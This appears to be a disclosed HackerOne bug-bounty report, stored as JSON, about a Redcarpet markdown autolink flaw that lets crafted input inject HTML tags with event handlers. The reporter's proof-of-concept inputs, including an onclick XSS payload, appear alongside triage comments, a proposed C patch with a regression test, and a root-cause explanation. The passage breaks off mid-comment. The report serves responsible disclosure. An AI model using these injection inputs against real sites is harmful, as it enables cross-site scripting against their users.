{"id":46916,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjkxNg==","url":"https://hackerone.com/reports/46916","title":"Markdown parsing issue enables insertion of malicious tags and event handlers","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2015-02-06T17:34:25.616Z","submitted_at":"2015-02-06T17:34:25.616Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"danlec","url":"/danlec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-04-07T21:12:33.546Z","bug_reporter_agreed_on_going_public_at":"2015-04-07T20:07:18.195Z","team_member_agreed_on_going_public_at":"2015-04-07T21:12:32.407Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When markdown is being presented as HTML, there seems to be a strange interaction between `_` and `@` that lets an attacker insert malicious tags.\r\n\r\n**Proof of Concept**\r\n\r\n```\r\n_http://danlec_@.1 foo=bar\r\n```\r\n\r\nis rendered converted to the following HTML:\r\n\r\n``` html\r\n\u003cp\u003e\u003cu\u003e\u003ca title=\"http://danlec\" href=\"http://danlec\"\u003ehttp://danlec\u003cdanlec_@.1 foo=bar\u003c/p\u003e\r\n```\r\n\r\nAs you can see, the output includes a `\u003cdanlec_@.1` tag that I can add arbitrary attributes (including event handlers) to.  (There's also an unterminated `\u003cu\u003e` tag which can cause subsequent content to be underlined)\r\n\r\n**Security Implications**\r\n\r\nI can use `style` to make this tag into a block element, and (if you're using a browser without CSP support for some reason) I can use an `onmouseover` or `onclick` event handler to execute script.  (An attacker might make the malicious tag appear to be a link to a \"proof of concept that only works in IE\")\r\n\r\nThis input might look like this: \r\n\r\n```\r\n_http://danlec_@.1 style=background-image:url(... data uri ...);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//\r\n```\r\n\r\nwhich is currently rendered as below.  Clicking on the \"Oh No!\" image in a browser like IE11 will cause script to execute.\r\n\r\n_http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAABACAMAAADlCI9NAAACcFBMVEX/AAD//////f3//v7/0tL/AQH/cHD/Cwv/+/v/CQn/EBD/FRX/+Pj/ISH/PDz/6Oj/CAj/FBT/DAz/Bgb/rq7/p6f/gID/mpr/oaH/NTX/5+f/mZn/wcH/ICD/ERH/Skr/3Nz/AgL/trb/QED/z8//6+v/BAT/i4v/9fX/ZWX/x8f/aGj/ysr/8/P/UlL/8vL/T0//dXX/hIT/eXn/bGz/iIj/XV3/jo7/W1v/wMD/Hh7/+vr/t7f/1dX/HBz/zc3/nJz/4eH/Zmb/Hx//RET/Njb/jIz/f3//Ojr/w8P/Ghr/8PD/Jyf/mJj/AwP/srL/Cgr/1NT/5ub/PT3/fHz/Dw//eHj/ra3/IiL/DQ3//Pz/9/f/Ly//+fn/UFD/MTH/vb3/7Oz/pKT/1tb/2tr/jY3/6en/QkL/5OT/ubn/JSX/MjL/Kyv/Fxf/Rkb/sbH/39//iYn/q6v/qqr/Y2P/Li7/wsL/uLj/4+P/yMj/S0v/GRn/cnL/hob/l5f/s7P/Tk7/WVn/ior/09P/hYX/bW3/GBj/XFz/aWn/Q0P/vLz/KCj/kZH/5eX/U1P/Wlr/cXH/7+//Kir/r6//LS3/vr7/lpb/lZX/WFj/ODj/a2v/TU3/urr/tbX/np7/BQX/SUn/Bwf/4uL/d3f/ExP/y8v/NDT/KSn/goL/8fH/qan/paX/2Nj/HR3/4OD/VFT/Z2f/SEj/bm7/v7//RUX/Fhb/ycn/V1f/m5v/IyP/xMT/rKz/oKD/7e3/dHT/h4f/Pj7/b2//fn7/oqL/7u7/2dn/TEz/Gxv/6ur/3d3/Nzf/k5P/EhL/Dg7/o6P/UVHe/LWIAAADf0lEQVR4Xu3UY7MraRRH8b26g2Pbtn1t27Zt37Ft27Zt6yvNpPqpPp3GneSeqZo3z3r5T1XXL6nOFnc6nU6n0+l046tPruw/+Vil/C8tvfscquuuOGTPT2ZnRySwWaFQqGG8Y6j6Zzgggd0XChWLf/U1OFoQaVJ7AayUwPYALHEM6UCWBDYJbhXfHjUBOHvVqz8YABxfnDCArrED7jSAs13Px4Zo1jmA7eGEAXvXjRVQuQE4USWqp5pNoCthALePFfAQ0OcchoCGBAEPgPGiE7AiacChDfBmjjg7DVztAKRtnJsXALj/Hpiy2B9wofqW9AQAg8Bd8VOpCR02YMVEE4xli/L8AOmtQMQHsP9IGUBZedq/AWJfIez+x4KZqgDtBlbzon6A8GnonOwBXNONavlmUS2Dx8XTjcCwe1wNvGQB2gxaKhbV7Ubx3QC5bRMUuAEvA9kFzzW3TQAeVoB5cFw8zQUGPH9M4LwFgML5IpL6BHCvH0DmAD3xgIUpUJcTmy7UQHaV/bteKZ6GgGr3eAq4QQEmWlNqJ1z0BeTvgGfz4gAFsDXfUmbeAeoAF0OfuLL8C91jHnCtBchYq7YzsMsXIFkmDDsBjwBfi2o6GM9IrOshIp5mA6vc42Sg1wJMEVUJlPgDpBzWb3EAVsMOm5m7Hg5KrAjcJJ5uRn3uLAvosgBrRPUgnAgApC2HjtpRwFTneZRpqLs6Ak+Lp5lAj9+LccoCzLYPZjBA3gIGRgHj4EuxewH6JdZhKBVPM4CL7rEIiKo7kMAvILIEXplvA/bCR2JXAYMSawtkiqfaDHjNtYVfhzJJBvBGJ3zmADhv6054W71ZrBNvHZDigr0DDCcFkHeB8wog70G/2LXA+xIrh03i02Zgavx0Blo+SA5Q+yEcrVSAYvjYBhwEPrEoDZ+KX20wIe7G1ZtwTJIDyMYU+FwBeuGLpaLqg91NcqnqgQU9Yre/ETpzkwXIIKAAmRnQruboUeiVS1cHmF8pcv70bqBVkgak1tgAaYbuw9bj9kFjVN28wsJvxK9VFQDGzjVF7d9+9z1ARJIHyMxRQNo2SDn2408HBsY5njZJPcFbTomJo59H5HIAUmIDpPQXVGS0igfg7detBqptv/0ulwfIbbQB8kchVtNmiQsQUO7Qru37jpQX7WmS/6YZPXP+LPprbVgC0ul0Op1Op9Pp/gYrAa7fWhG7QQAAAABJRU5ErkJggg==);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//\r\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-05-07T20:07:19.551Z","allow_singular_disclosure_after":-202935337.69795072,"singular_disclosure_allowed":true,"vote_count":12,"voters":["zzero","sourc7","s1r1u5","spam404","ali","r3y","ibram","japz","muhaddix","0619","and 2 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":326949,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @danlec,\n\nLooks like you got another one, I'm looking into this, and will keep you posted.\n\nCheers, @dirk","automated_response":false,"created_at":"2015-02-06T18:24:43.761Z","updated_at":"2015-02-06T18:24:43.761Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":326963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome.  The same kind of issue seems to affect things like\n\n`_:DL_@.-`\n\n`_www.=danlec_@..`\n\nâ€¦ if that helps you diagnose the issue.\n\n(Sorry for all the underlining)\n","automated_response":false,"created_at":"2015-02-06T18:41:38.473Z","updated_at":"2015-02-06T18:41:38.473Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":327219,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @danlec,\n\nThis was another amazing find. We've pinned down what's causing the vulnerability, and have disabled our automatic linking functionality to address the issue. We'd like to run a more thorough investigation into the root cause of this problem, and work on additional hardening of our markdown parser before re-enabling this feature again. We'll follow up with a reward and disclosure shortly.\n\nKind regards, @dirk","automated_response":false,"created_at":"2015-02-06T22:58:59.182Z","updated_at":"2015-02-06T22:58:59.182Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":327222,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, glad to help! :)  ","automated_response":false,"created_at":"2015-02-06T23:00:36.663Z","updated_at":"2015-02-06T23:00:36.663Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":332661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We are still looking into this issue, thank you for your patience!","automated_response":false,"created_at":"2015-02-16T09:44:35.714Z","updated_at":"2015-02-16T09:44:35.714Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":332662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For prosperity, I've attached a screenshot of how the original PoC looked:\n\n","automated_response":false,"created_at":"2015-02-16T09:45:39.841Z","updated_at":"2015-02-16T09:45:39.841Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"attachments":[{"id":29449,"filename":"Screen_Shot_2015-02-16_at_10.43.04_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/449/3b23ab33c482726b72661da56a79caf34820d56a/Screen_Shot_2015-02-16_at_10.43.04_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-02-16_at_10.43.04_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-02-16_at_10.43.04_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=72ef9b9177a80523229b8e49ce7ace8fec8f035ab4100c941ea050546e6a52b5"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341869,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like redcarpet etc still haven't been patched; any sense what the timeline one this one will be like?","automated_response":false,"created_at":"2015-02-27T11:57:11.966Z","updated_at":"2015-02-27T11:57:11.966Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341909,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've contacted the maintainers, however they appear to not have enough time to patch this bug. We're currently looking replacing RC with a different markdown parser, this makes our timeline a bit longer that we normally would have liked. \n\nWe'll keep you posted!","automated_response":false,"created_at":"2015-02-27T13:06:21.772Z","updated_at":"2015-02-27T13:06:21.772Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":357722,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @danlec,\n\nSlight change of course for us, we're still working on the search for a new markdown parser, but in the meantime we've hardened our HTML postprocessor, which also eliminates this bug. As you can see (www.example.com) our autolinking is enabled again, and your PoC no longer works. Could you verify that the bug is resolved?\n\nWe're closing the bug, but would like to ask you to hold off on requesting public disclosure. The folks behind Redcarpet need to be able to fix the issue before we disclose this one (within reason of course). \n\nA decision will be made shortly regarding the bounty we'll be awarding. \n\nCheers, and happy hunting!\n\nDirk","automated_response":false,"created_at":"2015-03-18T16:11:28.737Z","updated_at":"2015-03-18T16:12:40.096Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"danlec","url":"/danlec"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":357748,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @dirk\n\nI can verify that my original PoC no longer works.  \n\nPutting `_http://danlec_@.` in the body of a message does seem to make it link kinda funny.   \n\n`_http://danlec_@. all this text will disappear *stop linking*` \n\nbecomes \n\n_http://danlec_@. all this text will disappear *stop linking*\n\nâ€¦ but even if the output is strange, it doesn't seem to be dangerous.\n\nIn any case, I totally agree with giving redcarpet some time to get the issue resolved, and I'll wait for HackerOne to request the disclosure when you feel it's appropriate.","automated_response":false,"created_at":"2015-03-18T16:36:50.492Z","updated_at":"2015-03-18T16:37:11.598Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":358814,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't know if it'll help get the ball rolling with the redcarpet folks, but a potential fix for the issue is something like this:\n\n```\ndiff --git a/ext/redcarpet/markdown.c b/ext/redcarpet/markdown.c\nindex d68f7bb..c653dae 100644\n--- a/ext/redcarpet/markdown.c\n+++ b/ext/redcarpet/markdown.c\n@@ -461,7 +461,7 @@ tag_length(uint8_t *data, size_t size, enum mkd_autolink *autolink)\n static void\n parse_inline(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size)\n {\n-       size_t i = 0, end = 0;\n+       size_t i = 0, end = 0, consumed = 0;\n        uint8_t action = 0;\n        struct buf work = { 0, 0, 0, 0 };\n \n@@ -486,12 +486,13 @@ parse_inline(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t siz\n                if (end \u003e= size) break;\n                i = end;\n \n-               end = markdown_char_ptrs[(int)action](ob, rndr, data + i, i, size - i);\n+               end = markdown_char_ptrs[(int)action](ob, rndr, data + i, i - consumed, size - i);\n                if (!end) /* no action from the callback */\n                        end = i + 1;\n                else {\n                        i += end;\n                        end = i;\n+                       consumed = i;\n                }\n        }\n }\ndiff --git a/test/html_render_test.rb b/test/html_render_test.rb\nindex efdaf8b..31e9025 100644\n--- a/test/html_render_test.rb\n+++ b/test/html_render_test.rb\n@@ -238,4 +238,12 @@ HTML\n \n     assert_no_match %r{\u003cstyle\u003e}, output\n   end\n+\n+  def test_no_rewind_into_previous_inline\n+    options = { autolink: true, underline: true }\n+    output  = render(\"_!dl_1@danlec.com\", with: options)\n+\n+    assert_equal \"\u003cp\u003e\u003cu\u003e!dl\u003c/u\u003e\u003ca href=\\\"mailto:1@danlec.com\\\"\u003e1@danlec.com\u003c/a\u003e\u003c/p\u003e\\n\", output\n+  end\n+\n end\n```\n\nAs far as I can tell, the issue stems from the fact that the inline parsers are being allowed to rewind to the beginning of a block, **including into parts that have already been consumed**.\n\nIf we walk through `_!dl_1@danlec.com` as an example:\n\n```\nOutput buffer: \nInput: _!dl_1@danlec.com\ni -----^\n```\n\nThe `_` is recognized as the beginning of an underlined bit of text, and output as a `\u003cu\u003e`\n\n```\nOutput buffer: \u003cu\u003e!dl\u003c/u\u003e\nInput: _!dl_1@danlec.com\ni ----------^\n```\n\nThe `1` isn't special so it's output directly\n\n```\nOutput buffer: \u003cu\u003e!dl\u003c/u\u003e1\nInput: _!dl_1@danlec.com\ni -----------^\n```\n\nThe `@` is recognized as being a potential email address.  The inline parser walks back until it gets to the first character that isn't valid in an email address; currently the rewind is allowed to go all the way to the beginning of the input, so it rewinds `4` characters until it reaches the `!`.  It also considers the `danlec.com` portion to be the domain of the email address.\n\nWhen replacing the email address with the HTML for the `\u003ca\u003e` tag, it truncates the output buffer by the number of characters it rewound before adding the `\u003ca\u003e`, expecting that those are just plain text.\n\nUnfortunately, those characters actually include some HTML (the `\u003c/u\u003e` tag), and so it ends up clipping off part of that\n\n```\nOutput buffer: \u003cu\u003e!dl\u003c/u\u003e1\n// Remove the 4 characters we \"rewound\", expecting them to be dl_1\nOutput buffer: \u003cu\u003e!dl\u003c\n// Add the \u003ca\u003e tag\nOutput buffer: \u003cu\u003e!dl\u003c\u003ca href=\"mailto:dl_1@danlec.com\"\u003emailto:dl_1@danlec.com\u003c/a\u003e\n```\n\nâ€¦ except in the configuration that HackerOne is using, emails aren't actually rendered as links, so we end up with\n\n```\n\u003cu\u003e!dl\u003cdl_1@danlec.com\n```\n\nâ€¦ which is bad news because any text that follows would be interpreted by a browser as attributes on the `dl_1@danlec.com` \"tag\".\n \nA potential fix is to limit the ability to rewind so the rewind can't ever include characters that were part of a different inline element.","automated_response":false,"created_at":"2015-03-19T18:31:23.415Z","updated_at":"2015-03-19T18:31:23.415Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":359675,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So this was obviously [a bug in sundown](https://github.com/vmg/sundown/blob/master/src/markdown.c#L801), the deprecated C markdown library.  [Hoedown](https://github.com/hoedown/hoedown), a \"revived\" fork has the same underlying issue\n\n```\n$ ./hoedown --underline --autolink --skip-html\n_:DL_@danlec.com\n\u003cp\u003e\u003cu\u003e:DL\u003c\u003ca href=\"mailto:DL_@danlec.com\"\u003eDL_@danlec.com\u003c/a\u003e\u003c/p\u003e\n```\n\nIt looks like that code made it's way into other libraries (including redcarpet).  Playing around with GitHub's markdown parser, for example, it looks like the have the same sort of thing happening â€¦ however they must have a later step that cleans up the HTML.  In their case\n\n```\n_danlec_@danlec.com\n``` \n\nbecomes \n\n```\n\u003cp\u003e\u003cem\u003edan\u003ca href=\"mailto:_danlec_@danlec.com\" rel=\"noreferrer\"\u003e_danlec_@danlec.com\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n```\n\nâ€¦ which seems like a bizarre result until you take the rewind bug into account; a new `\u003c/em\u003e` gets stuck on the end because the original `\u003c/em\u003e` was overwritten by a rewind and a later step is trying to balance the tags.\n\nFortunately, it *seems* that this bug only likely to result in a vulnerability in cases where the default HTML rendering of email links has been overridden.","automated_response":false,"created_at":"2015-03-20T19:56:46.623Z","updated_at":"2015-03-20T19:56:46.623Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":360289,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2015-03-22T13:15:01.269Z","updated_at":"2015-03-22T13:15:01.269Z","actor":{"username":"robin850","cleared":false,"url":"/robin850","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/158/f68958f599d6303854a39d92e3786d097f4a024e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":360838,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, I realized that redcarpet will render \n\n`pad12345_www.danlec.com_@danlec.com`\n\nas\n\n```html\n\u003cp\u003epad12345\u003cu\u003e\u003ca href=\"http://www.danlec.com\u003ca href=\"mailto:pad12345_www.danlec.com_@danlec.com\"\u003epad12345_www.danlec.com_@danlec.com\u003c/a\u003e\u003c/p\u003e\n```\n\nâ€¦ so even without overriding the autolink renderer, you can cause the HTML to get in a bad state, because you can cause one of the closing `\"` in a link tag to be overwritten.\n","automated_response":false,"created_at":"2015-03-23T17:01:01.664Z","updated_at":"2015-03-23T17:01:01.664Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":361376,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for this awesome report. We would like to wait with public disclosure for the Redcarpet team to respond/get a fix out, but we also didn't want to keep you waiting on your bounty!","automated_response":false,"created_at":"2015-03-24T01:02:31.024Z","updated_at":"2015-03-24T01:02:31.024Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"5000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"danlec","url":"/danlec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":361687,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!  Let me know if there's anything I can help out withâ€¦","automated_response":false,"created_at":"2015-03-24T12:20:36.546Z","updated_at":"2015-03-24T12:20:36.546Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":372683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there!\n\nThe provided patch has been finally committed on our side, thank you **very** much for your work on this issue, this is really awesome ! Here's [the commit](https://github.com/vmg/redcarpet/commit/a6c759d7e7cbdd8cb8a1876f97a38b1befe221d5) ; you've been credited for your awesome patch and explanations.\n\nThis patch will be available in Redcarpet 3.2.3, that should be released really soon.\n\n\u003e Slight change of course for us, we're still working on the search for a new markdown parser\n\nIs it because of this kind of issue or do you want to stop using Redcarpet for other reasons ? In the latter case, feel free to send an e-mail or report issues on the tracker ! :-)\n\nThanks everyone! \u003c3 \u003c3 \u003c3","automated_response":false,"created_at":"2015-04-05T18:09:20.750Z","updated_at":"2015-04-05T18:09:20.750Z","actor":{"username":"robin850","cleared":false,"url":"/robin850","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/158/f68958f599d6303854a39d92e3786d097f4a024e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":373380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the record, I notified the maintainers of Hoedown and the GitHub security team and pointed them at the changeset @robin850 committed (â€¦since I mentioned both them both in this 